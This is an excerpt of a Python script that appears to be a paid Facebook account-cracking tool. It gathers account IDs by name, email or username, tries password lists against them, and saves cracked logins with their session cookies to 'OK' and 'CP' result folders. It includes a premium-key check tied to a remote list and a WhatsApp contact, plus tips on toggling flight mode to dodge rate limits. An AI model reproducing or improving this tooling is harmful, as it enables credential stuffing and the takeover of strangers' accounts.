...
try:
    rq = requests.get('https://raw.githubusercontent.com/SHAHZAD-AAHME/BD-71-POWER/main/Approved.txt').text
...
def banner():
        os.system("clear")
        os.system('echo -e "\n\x1b[1;91m███████╗ █████╗      ██╗     ██╗ █████╗ ██████╗\n\x1b[1;91m██╔════╝██╔══██╗     ██║     ██║██╔══██╗██╔══██╗\n\x1b[1;92m███████╗███████║     ██║     ██║███████║██║  ██║\n\x1b[1;92m╚════██║██╔══██║██   ██║██   ██║██╔══██║██║  ██║\n\x1b[1;91m███████║██║  ██║╚█████╔╝╚█████╔╝██║  ██║██████╔╝\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : SAJJAD VERSION 2.0  \n \x1b[1;93m(*)\x1b[1;93m FB        : Shahzada Ahmed Sajjad\n \x1b[1;93m(*)\x1b[1;95m Tool Name : SAJJAD\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/SHAHZADA-AHMED\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
...
def menu():
    ...
    psb('         %s》%s》%s》%sWELLCOME TO SHAHZADA TOOL%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : SHAHZADA,KANHA'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : SHAHZADAkanha "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
...
def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sSHAHZADA KANHA"%(H,P,H,K,H));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
        ...
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    files_cp = "SHAHZADA-CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sSHAHZADA-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "SHAHZADA-OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sSHAHZADA-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%sSHAHZADA-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("SHAHZADA-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("SHAHZADA-OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sSHAHZADA-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("SHAHZADA-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("SHAHZADA-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sSHAHZADA-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sSHAHZADA-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sSHAHZADA-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sSHAHZADA-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("SHAHZADA-CP")
    except:pass
    try:os.mkdir("SHAHZADA-OK")
    except:pass
...
def genkey():
	try:
		...
		subprocess.check_output(["am", "start", "https://wa.me/+8801840215106"])
		exit()
	except(IOError):
		rb = rx
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF SHAHZADA%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;91m.          PAYMENT CANT BE UNDONE")
		print("\033[0;91m.          CHANGE USER AGENT IF CP IDS CAME")
